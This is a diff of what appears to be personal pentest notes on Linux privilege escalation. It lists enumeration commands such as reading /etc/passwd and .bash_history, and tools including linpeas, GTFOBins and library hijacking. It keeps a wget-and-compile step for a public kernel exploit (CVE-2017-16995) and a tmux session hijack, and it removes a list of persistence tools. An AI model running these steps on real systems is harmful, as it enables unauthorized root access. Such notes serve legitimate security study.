@@ -9,24 +9,20 @@ PROCESS:
         - sudo -l
         - sudo -V
         - cat .bash_history
-        - cat /etc/passwd
-    - Auto Vector Finding
-        - linpeas.sh
-- Maintain Access
+        - cat /etc/passwd    
+    - Using kit
+        - [linpeas.sh] Auto Vector Finding
+- Maintain Access    
 TOOLS
-- Kernel Exploit
-    - CVE-2017-16995
-    - CVE-2021-4034
+- Exploit
 - GTFOBins
-    - find
-    - vim
-    - sudo
 - Python Library Hijacking
+- Environment variables
 OUPUT:
 - root shell
 
 
-## Privilege Escalation
+## Exploit
 [cve-2017-16995]
     wget https://www.exploit-db.com/download/45010 -O cve-2017-16995.c
     gcc --static cve-2017-16995.c -o cve-2017-16995
@@ -43,10 +39,6 @@ OUPUT:
 [tmux]
     tmux -S default attach
 
-## Maintain Access
-- PowerSploit
-- Weewly
-- dns2tcp
 
 
 
